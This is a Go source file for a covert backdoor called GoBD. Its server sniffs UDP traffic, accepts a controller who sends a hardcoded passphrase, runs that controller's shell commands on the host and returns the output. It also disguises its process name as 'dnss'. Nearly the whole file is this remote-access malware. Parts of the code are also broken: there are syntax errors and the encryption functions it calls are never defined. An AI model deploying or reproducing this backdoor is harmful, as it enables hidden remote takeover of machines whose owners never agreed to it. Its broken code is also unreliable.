package main
/* bdmain.go
PROGRAM: GoBD
AUTHOR: Ramzi Chennafi
DATE: October 18 2015
FUNCTIONS:
 main()
 SetProcessName(string) error
 intiateClient(ip string, port, lport int)
 grabOutput(serverConn *net.UDPConn) 
 intiateServer(iface string, port, lport int)
 handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int)
 executeServerCommand(data, ip string, port int)
 executeCommand(cmd, ip string, port int)
 sendEncryptedData(port int, data, ip string)
 checkError(err error) 
 GetLocalIP() string

ABOUT:
  bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
 the server and client. The communications are done using UDP  including packet sniffing to create backdoor communications. 
 All messages are encrypted using AES-256 and client to sever connections require authentication using the control code.

USAGE:
 Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
 two programs can be used across any operating system, commands will be executed the same.
*/
import(
	"os"
	"os/exec"
	"reflect"
	"unsafe"
	"flag"
	"runtime"
	"fmt"
	"strings"
	"strconv"
	"io"
	"bufio"
	"log"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)
const passwd = "DAMNPANDIMENSIONALMICE"; //The authentication code
var authenticatedAddr string; //Currently authenticated address
/* 
    FUNCTION: func main()
    RETURNS: Nothing
    
    ABOUT:
    The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
*/
func main(){

	SetProcessName("dnss");

	//flags
	modePtr := flag.String("mode", "client", "The mode of the application, may either be" +
		" client or server. Defaults to client.");
	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
	portPtr := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
	lPortPtr := flag.Int("lport", 3321, "The port for the client to listen on.");
	//flags
	
	flag.Parse();

	intiateTools();
	
	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr);
		intiateClient(*ipPtr, *portPtr, *lPortPtr);
		break;
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
		intiateServer(*interfacePtr, *portPtr, *lPortPtr);
	}
}
/* 
    FUNCTION: func intiateClient(ip string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func intiateClient(ip string, port, lport int){
	
	for {
		fmt.Print("Please input the authentication code: ");
		authcode, _ := terminal.ReadPassword(0);
		authstr := string(authcode);

		if authstr == passwd {
			sendEncryptedData(port, authstr, ip);
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}
 
	fmt.Printf("Authentication accepted, you may now send commands.\n");
	fmt.Printf("Type ?help for more info on sending client commands.\n");

	serverAddr,err := net.ResolveUDPAddr("udp", ":" + strconv.Itoa(lport));
	checkError(err);

	serverConn, err := net.ListenUDP("udp", serverAddr);
	checkError(err);
	
	defer serverConn.Close()

	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		if strings.HasPrefix(input, "!") {
			sendEncryptedData(port, "[BD]" + input, ip);
		} else if input == ?help {
			fmt.Printf("Client Usage Help\n" +
				"=================================\n" +
				"EXEC Commands\n" +
				"Sending any command will result in it being executed by the backdoor at the other end.\n" +
				"Once the command is sent, you will recieve the output back from the backdoor.\n" +
				"============\n" + 
				"BD Commands\n" +
				"These commands are prefixed by a ! and are executed on the backdoors own program options\n" +
				"!setprocess [name]\n" +
				"==================================\n");
		} else {
			sendEncryptedData(port, "[EXEC]" + input, ip);
		}
		
		grabOutput(serverConn);
	}
}
/* 
    FUNCTION: grabOutput(serverConn *net.UDPConn)
    RETURNS: Nothing
    ARGUMENTS: 
                serverConn *net.UDPConn - A pointer to the server listening connection.

    ABOUT:
    Retrieves incoming data from UDP. Assumes no text will be greater than the maximum UDP size.
*/
func grabOutput(serverConn *net.UDPConn) {
	
	buf := make([]byte, 65536);
	for {
		n,_,err := serverConn.ReadFromUDP(buf)
		if err != nil {
			fmt.Println("Error: ", err)
		}

		data := decrypt_data(buf[0:n]);
		
		if strings.HasSuffix(data, "[END]"){
			fmt.Printf("%s", data[0:(n-5)]);
			break;
		}
		fmt.Printf("%s", data);
	}
}
/* 
    FUNCTION: func intiateServer(iface string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string iface : the net interface to listen on
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Performs packet sniffing using gopacket (libpcap). 
*/
func intiateServer(iface string, port, lport int){

	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
	checkError(err);
	err := handle.SetBPFFilter("udp");
	checkError(err);

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		if err == io.EOF {
			break
		} else if err != nil {
			log.Println("Error:", err)
			continue;
		}
		if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
			if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
				handlePacket(ipLayer.(*layers.IPv4), udpLayer.(*layers.UDP), port, lport);
			}
		}
	}
}
/* 
    FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
    RETURNS: Nothing
    ARGUMENTS: 
                *layers.IPv4 ipLayer - the ip part of the packet recieved
                *layers.UDP udpLayer - the udp part of the packet recieved
                  int port : port to send data to
                  int lport : port to listen for data on

    ABOUT:
    Performs packet sniffing using gopacket (libpcap). 
*/
func handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
	
	if authenticatedAddr == ipLayer.SrcIP.String() {
		data := decrypt_data([]byte(udpLayer.Payload));
		if strings.HasPrefix(data, "[EXEC]") {
			executeCommand(data, ipLayer.SrcIP.String(), port);
		}
		if strings.HasPrefix(data, "[BD]") {
			executeServerCommand(data, ipLayer.SrcIP.String(), port);
		}

	}else if lport == int(udpLayer.DstPort) {
		data := decrypt_data([]byte(udpLayer.Payload));
		if data == passwd {
			fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP);
			authenticatedAddr = ipLayer.SrcIP.String();
		}
	}
}
/* 
    FUNCTION: func  executeServerCommand(data, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string data : command to execute

    ABOUT:
    Executes incoming client commands on the GoBD program itself. Current commands include:
              setprocess [name] - sets the process name of the gobd program
              exit - exits the gobd program cleanly
*/
func executeServerCommand(data, ip string, port int) {

	fmt.Printf("%s\n", data);

	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
	args := strings.Split(tempstr[1], " ");

	var out string;
	
	switch args[0] {
	case "setprocess" :
		err := SetProcessName(args[1]);
		if err != nil {
			fmt.Printf("%s\n", err);
			out = fmt.Sprintf("%s", err);
		} else {
			out = fmt.Sprintf("Process name set to %s\n", args[1]);
		}
		break;

	case "exit" :
		sendEncryptedData(port, "Server exiting...\n[END]", ip);
		runtime.Goexit();
		break;

	case default :
		out = "Not a valid command.\n";
	}

	fmt.Printf("%s", out);

	sendEncryptedData(port, out + "[END]", ip);	
}
/* 
    FUNCTION: func  executeCommand(cmd, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string cmd : command to execute

    ABOUT:
    Executes incoming client commands on the host machine.
*/
func executeCommand(cmd, ip string, port int){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]) + "[END]", ip);
}
/* 
    FUNCTION: sendEncryptedData(port int, data, ip string)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to

    ABOUT:
    Sends encrypted data over UDP to the spcified port and ip.
*/
func sendEncryptedData(port int, data, ip string) {
	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	checkError(err);
	
	cryptdata := encrypt_data(data);
	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
	checkError(err);
}
///Utility Functions//////////////////////////////////////////
/* 
    FUNCTION: func checkError(err error)
    RETURNS: Nothing
    ARGUMENTS: 
              err error : the error code to check

    ABOUT:
    Checks an error code, panics if the error is not nil.
*/
func checkError(err error){
	if err != nil {
		panic(err)
	}
}
/* 
    FUNCTION: func SetProcessName(name string) error
    RETURNS: err Error, if anything goes wrong
    ARGUMENTS: 
                string name: the new process name to set the program to

    ABOUT:
    Sets the process name of the GoBD program to name.
*/
func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}

/* 
    FUNCTION: func GetLocalIP() string
    RETURNS: String, the local ip 

    ABOUT:
    Grabs the local ip of the host system.
*/
func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs();
	checkError(err);
	
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String();
            }
        }
    }
	
    return "";
}
